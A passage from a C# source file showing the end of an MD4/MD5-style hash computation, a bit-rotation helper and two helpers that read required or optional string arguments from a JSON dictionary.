                (a, b, c, d) = (d, a, b, c);
            }

            a += aa; b += bb; c += cc; d += dd;
        }

        byte[] hash = new byte[16];
        Array.Copy(BitConverter.GetBytes(a), 0, hash, 0, 4);
        Array.Copy(BitConverter.GetBytes(b), 0, hash, 4, 4);
        Array.Copy(BitConverter.GetBytes(c), 0, hash, 8, 4);
        Array.Copy(BitConverter.GetBytes(d), 0, hash, 12, 4);
        return hash;
    }

    private static uint RotateLeft(uint x, int n) => (x << n) | (x >> (32 - n));

    private static string GetString(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val))
            throw new ArgumentException($"Missing required argument: {key}");
        return val.GetString() ?? throw new ArgumentException($"Null value for: {key}");
    }

    private static string? GetStringOpt(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val)) return null;
        return val.GetString();
    }
}
